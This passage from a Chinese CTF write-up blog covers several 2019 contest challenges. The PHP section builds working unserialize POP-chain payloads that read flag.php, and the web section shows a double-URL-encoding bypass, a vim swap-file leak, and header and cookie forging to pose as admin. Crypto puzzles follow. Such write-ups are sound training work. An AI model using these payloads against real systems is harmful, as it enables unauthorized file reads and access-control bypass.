class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含<code>flag.php</code>，那就是要读取其中的内容即可；发现了<code>unserialize()</code>，又是和php反序列化联系起来，由于还是萌新，所以还只是简单了解反序列化的东西，也就是知道几个魔术方法，从飘零学长的博客了解到是关于pop链的构造，对于pop链的构造一无所知，第一次使用，记录一下； </p><blockquote><p>以前理解的序列化攻击更多的是在魔术方法中出现一些利用的漏洞，因为自动调用从而触发漏洞。但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p></blockquote><p>问题具体分析：</p><ol><li>baby类三个变量：<code>skyobj,aaa,bbb</code>，两个魔术方法：<code>__construct(),__toString()</code>，反序列化时会自动调用；</li><li>其中<code>__construct()</code>定义<code>skyobj</code>是<code>sec类</code>的一个对象，sec类中会调用<code>read()</code>方法；</li><li>其中<code>__toString()</code>调用<code>skyobj</code>的<code>read()</code>方法；</li><li><code>cool</code>类中也是由<code>read()</code>方法的；</li></ol><p>关键代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</span><br><span class="line">&#123;</span><br><span class="line">    $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        </span><br><span class="line">    if (file_get_contents($file))         </span><br><span class="line">    &#123;              </span><br><span class="line">    return file_get_contents($file); </span><br><span class="line">    &#125;  </span><br><span class="line">    else </span><br><span class="line">    &#123; </span><br><span class="line">    return &quot;you must be joking!&quot;; </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常明显是满足<code>$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb</code>即可以读出文件内容，如果构造一个data，使得反序列化后自动调用魔术方法后，通过<code>if判断</code>语句，改变可控变量<code>$filename</code>即可读取到文件内容；</p><p><strong>solution1</strong></p><p>到这里思路就非常明显了：</p><ol><li>从调用<code>sec</code>的<code>read</code>方法改变为调用<code>cool</code>的<code>read</code>方法；</li><li>无需设置$amzing的值，即为NULL，则反序列化后的<code>$this-&gt;nice-&gt;aaa</code>和<code>$this-&gt;nice-&gt;bbb</code>都为NULL，即可成功通过if判断语句；</li></ol><p>构造exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();     <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=O:4:&quot;baby&quot;:3:&#123;s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;&#125;s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line">urlencode(data)=O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="https://s2.ax1x.com/2019/02/23/khLLE6.png" alt="khLLE6.png"></p><p><strong>solution2</strong></p><p>这里的<code>$this-&gt;nice-&gt;aaa</code>被赋值为为止变量<code>$sth</code>，从飘零学长那里学习到另一种构造方法来通过if判断，即通过两个不同的变量名访问同一个内容，无论其中一个怎么变，另一个变量总是指向他现在的值，即可构造如下，：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line">$test-&gt;bbb=&amp;$test-&gt;aaa;</span><br></pre></td></tr></table></figure><p>exp1构造<code>$amzing</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();    <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line">$test-&gt;bbb=&amp;$test-&gt;aaa;    <span class="comment">//指向同一个地址</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$amzing=O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>baby%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>skyobj%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>cool%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nice%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>amzing%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>aaa%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>bbb%<span class="number">22</span>%<span class="number">3</span>BR%<span class="number">3</span>A6%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><code>$amzing</code>反序列化后的<code>aaa</code>和<code>bbb</code>就相等了，这里就完成构造<code>$amzing</code>；</p><p>最终exp2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();    <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line"><span class="comment">//$test-&gt;bbb=&amp;$test-&gt;aaa;</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>设置<code>$filename=&#39;flag.php&#39;</code>，设置<code>$amzing</code>即可；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10009/index.php?data=O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>执行顺序分析：</p><ol><li>首先反序列化<code>$data</code>，得到一个baby类的对象；</li><li>默认调用魔术方法，即可调用<code>read</code>；</li><li>反序列化<code>$amzing</code>赋值给<code>$nice</code>，此时的<code>$nice-&gt;aaa</code>和<code>$nice-&gt;bbb</code>相等，可以通过if判断；</li><li>读文件<code>$test-&gt;skyobj-&gt;filename</code>；</li></ol><p><strong>参考链接：</strong><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">pop链构造</a>，<a href="https://skysec.top/2019/01/25/2019%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9BWriteip/" target="_blank" rel="noopener">飘零学长wp</a>，</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h3><p>百度到键盘之争：</p><p><img src="https://s2.ax1x.com/2019/02/24/k4vEff.png" alt="k4vEff.png"></p><p>对应到的键盘如下：</p><p><img src="https://s2.ax1x.com/2019/02/24/k4vM0s.png" alt="k4vM0s.png"></p><p>写个对应的列表，替换对应的字符，解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dic_1=[<span class="string">'q'</span>,<span class="string">'w'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'y'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">';'</span>,<span class="string">'"'</span>,<span class="string">'z'</span>,<span class="string">'x'</span>,<span class="string">'c'</span>,<span class="string">'v'</span>,<span class="string">'b'</span>,<span class="string">'n'</span>,<span class="string">'m'</span>,<span class="string">'+'</span>,<span class="string">'_'</span>]</span><br><span class="line">dic_2=[<span class="string">'"'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'p'</span>,<span class="string">'y'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'c'</span>,<span class="string">'r'</span>,<span class="string">'l'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'e'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'d'</span>,<span class="string">'h'</span>,<span class="string">'t'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'_'</span>,<span class="string">';'</span>,<span class="string">'q'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'x'</span>,<span class="string">'b'</span>,<span class="string">'m'</span>,<span class="string">'&#125;'</span>,<span class="string">'&#123;'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    str0=<span class="string">'ypau_kjg;"g;"ypau+'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str0:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dic_1:</span><br><span class="line">            num=dic_1.index(i)</span><br><span class="line">            res+=dic_2[num]</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><a href="https://imgchr.com/i/k4x65q" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/24/k4x65q.md.png" alt="k4x65q.md.png"></a></p><h1 id="杭电Hgame-2019-week1-WP"><a href="#杭电Hgame-2019-week1-WP" class="headerlink" title="杭电Hgame-2019-week1-WP"></a>杭电Hgame-2019-week1-WP</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h3><p>题目提示：vim，没好好关机，知道了是Linux的vim异常退出；</p><p>于是尝试访问<code>.index.html.swp</code>，成功下载swp文件，拖进十六进制编辑器查看得到flag：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0X9Sg.png" alt="k0X9Sg.png"></p><h3 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h3><p>如下界面：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0XM6J.png" alt="k0XM6J.png"></p><p>随便输入了内容提交得到提示：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0XYtK.png" alt="k0XYtK.png"></p><p>提示需要POST，那就hackbar直接post一个值：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0Xd6H.png" alt="k0Xd6H.png"></p><p>又来提示需要本地登录，那就加上<code>X-Forwarded-For</code>的请求头：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jnEt.png" alt="k0jnEt.png"></p><p>提示需要修改<code>User-Agent</code>，那就直接修改：</p><p><a href="https://imgchr.com/i/k0jwCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0jwCT.md.png" alt="k0jwCT.md.png"></a></p><p>又要求<code>the requests should referer from www.bilibili.com</code>，继续添加：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jB2F.png" alt="k0jB2F.png"></p><p>要求是管理员登录…有点无从下手，想了一下既然是换头大作战…查看请求头发现Cookie里有admin=0关键字，索性直接修改为1，payload如下：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jR56.png" alt="k0jR56.png"></p><p>得到flag：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jLIP.png" alt="k0jLIP.png"></p><h3 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h3><p>代码审计初体验：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">"vidar"</span>,$_GET[<span class="string">'id'</span>])!==<span class="keyword">FALSE</span>)</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"&lt;p&gt;干巴爹&lt;/p&gt;"</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'id'</span>] === <span class="string">"vidar"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>非常简单的url二次编码绕过，GET进来的id已经被urldecode一次了，代码意思是继续decode得到<code>vidar</code>；</p><p><strong>payload:</strong><code>http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576%2569%2564%2561%2572</code></p><h3 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h3><p>查看源代码有提示：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0xfje.png" alt="k0xfje.png"></p><p>查看响应头：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0x7Nt.png" alt="k0x7Nt.png"></p><p>于是直接post一个password过去：</p><p><a href="https://imgchr.com/i/k0zC40" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zC40.md.png" alt="k0zC40.md.png"></a></p><p>点进去…说太快了：</p><p><a href="https://imgchr.com/i/k0zF3T" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zF3T.md.png" alt="k0zF3T.md.png"></a></p><p>那就抓个包试试…得到flag：</p><p><a href="https://imgchr.com/i/k0zkgU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zkgU.md.png" alt="k0zkgU.md.png"></a></p><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h3><blockquote><p>Description:</p><p>–…/….-/….-/-…/–…/…–/…../..-./-…./-../-…./..-./–…/—-./….-/….-/–…/.—-/-…./-…/–…/-…/-…./..—/…../.—-/-…./-…./…–/….-/…–/—–/-…./…../–…/-.. So easy</p></blockquote><p>看起来就是摩斯密码没错了，找个在线解密即可得到16进制，解码得到字符，凯撒移位后观察关键字母，栅栏移位即可得到flag；</p><h3 id="base全家"><a href="#base全家" class="headerlink" title="base全家"></a>base全家</h3><p><a href="https://imgchr.com/i/ko86FH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/ko86FH.md.png" alt="ko86FH.md.png"></a></p><p>我就不说了…呆了，解半天也没想到个好办法，python跑一下，既然是base全家桶系列，直接用异常处理即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=open(<span class="string">'cnm.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">p=f.read()</span><br><span class="line">n=<span class="string">''</span></span><br><span class="line">step=[]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b16decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b32decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        